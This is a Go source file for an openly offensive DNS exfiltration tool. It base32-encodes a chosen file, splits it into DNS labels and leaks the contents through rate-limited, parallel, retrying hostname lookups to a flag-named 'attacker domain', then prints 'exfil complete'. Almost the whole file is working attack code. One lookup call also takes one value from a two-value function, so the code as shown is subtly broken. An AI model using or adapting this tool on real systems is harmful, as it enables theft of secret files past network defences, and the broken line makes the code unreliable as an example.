package main

import (
	"context"
	"encoding/base32"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"
	"unicode/utf8"
)

func readAll(path string) ([]byte, error) {
	if path == "-" {
		return io.ReadAll(os.Stdin)
	}
	return os.ReadFile(path)
}

func chunkStringByBytes(s string, size int) []string {
	if size <= 0 {
		return []string{s}
	}
	var out []string
	b := []byte(s)
	for i := 0; i < len(b); i += size {
		j := i + size
		if j > len(b) {
			j = len(b)
		}
		for !utf8.Valid(b[i:j]) && j > i {
			j--
		}
		out = append(out, string(b[i:j]))
	}
	return out
}

func toLabel(s string) string {
	s = strings.ToLower(s)
	return s
}

func lookupWithTimeout(ctx context.Context, resolver *net.Resolver, name string) error {
	cctx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()
	_, err := resolver.LookupHost(cctx, name)
	return err
}

func validLabelSize(sz int) int {
	if sz > 63 {
		return 63
	}
	if sz < 1 {
		return 1
	}
	return sz
}

func validFQDN(name string) bool {
	return len(name) <= 255
}

func exponentialSleep(attempt int) {
	if attempt <= 0 {
		time.Sleep(100 * time.Millisecond)
		return
	}
	sleep := time.Duration(100*(1<<uint(attempt))) * time.Millisecond
	if sleep > 10*time.Second {
		sleep = 10 * time.Second
	}
	time.Sleep(sleep)
}

func main() {
	domain := flag.String("domain", "", "attacker domain")
	file := flag.String("file", "", "file path or '-' for stdin")
	session := flag.String("session", fmt.Sprintf("%d", time.Now().Unix()), "session id")
	rate := flag.Int("rate", 60, "queries per minute (cap 600)")
	labelSize := flag.Int("label", 50, "chars per DNS label (<=63)")
	retries := flag.Int("retries", 3, "retries per label")
	timeoutMs := flag.Int("timeout", 3000, "per-lookup timeout ms")
	parallel := flag.Int("parallel", 4, "concurrency")
	verbose := flag.Bool("v", false, "verbose")
	dry := flag.Bool("dry-run", false, "do not perform DNS lookups, only print names")
	flag.Parse()

	if *domain == "" || *file == "" {
		fmt.Fprintln(os.Stderr, "usage: -domain attacker.com -file secret.txt ...")
		os.Exit(2)
	}

	if *rate < 1 {
		*rate = 1
	}
	if *rate > 600 {
		*rate = 600
	}
	*labelSize = validLabelSize(*labelSize)
	if *parallel < 1 {
		*parallel = 1
	}

	data, err := readAll(*file)
	if err != nil {
		log.Fatalf("read error: %v", err)
	}

	enc := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
	enc = toLabel(enc)
	labels := chunkStringByBytes(enc, *labelSize)
	total := len(labels)

	interval := time.Minute / time.Duration(*rate)
	if interval < time.Millisecond {
		interval = time.Millisecond
	}

	sem := make(chan struct{}, *parallel)
	var wg sync.WaitGroup
	var mu sync.Mutex
	failed := 0
	resolver := net.DefaultResolver
	ctx := context.Background()

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	send := func(name string) error {
		if !validFQDN(name) {
			return fmt.Errorf("fqdn too long: %d", len(name))
		}
		if *dry {
			if *verbose {
				log.Printf("[dry] %s", name)
			}
			return nil
		}
		lookupCtx, cancel := context.WithTimeout(ctx, time.Duration(*timeoutMs)*time.Millisecond)
		defer cancel()
		err := resolver.LookupHost(lookupCtx, name)
		if err == nil {
			return nil
		}
		return err
	}

loop:
	for i, lbl := range labels {
		seq := i + 1
		seqLabel := fmt.Sprintf("%d", seq)
		l := toLabel(lbl)
		name := fmt.Sprintf("%s.%s.%s.%s", seqLabel, l, *session, *domain)
		wg.Add(1)
		sem <- struct{}{}
		go func(name string, seq int) {
			defer wg.Done()
			defer func() { <-sem }()
			success := false
			for r := 0; r < *retries; r++ {
				err := send(name)
				if err == nil {
					success = true
					break
				}
				exponentialSleep(r)
			}
			if !success {
				mu.Lock()
				failed++
				mu.Unlock()
				if *verbose {
					log.Printf("failed label: %s", name)
				}
			} else {
				if *verbose {
					log.Printf("sent label %d/%d", seq, total)
				}
			}
		}(name, seq)
		select {
		case <-ticker.C:
		case <-time.After(5 * time.Second):
			break loop
		}
	}

	wg.Wait()

	doneName := fmt.Sprintf("done.%s.%s", *session, *domain)
	_ = send(doneName)

	cleanupName := fmt.Sprintf("cleanup.%s.%s", *session, *domain)
	_ = send(cleanupName)

	if failed > 0 {
		log.Fatalf("finished with %d failed labels", failed)
	}
	log.Println("exfil complete")
}
